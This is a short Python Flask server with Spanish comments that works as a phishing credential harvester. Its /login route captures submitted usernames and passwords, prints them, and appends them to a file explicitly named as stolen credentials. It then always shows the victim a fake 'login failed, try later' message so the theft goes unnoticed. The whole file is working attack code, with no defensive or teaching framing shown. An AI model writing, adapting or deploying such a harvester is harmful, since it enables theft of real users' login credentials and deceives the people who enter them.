from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # DEBUG: Imprimir en consola
    print(f"\n[!] Credenciales recibidas: {username}:{password}", flush=True)
    
    # Verificar si el archivo existe y su ruta
    file_path = "/app/credenciales_robadas.txt"
    print(f"[!] Ruta del archivo: {file_path}", flush=True)
    print(f"[!] Existe archivo: {os.path.exists(file_path)}", flush=True)
    
    try:
        with open(file_path, "a") as f:
            f.write(f"{username}:{password}\n")
            print(f"[!] Credenciales guardadas en {file_path}", flush=True)
    except Exception as e:
        print(f"[!] ERROR al guardar: {e}", flush=True)
    
    return "Error de inicio de sesión. Inténtelo de nuevo más tarde.", 401

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
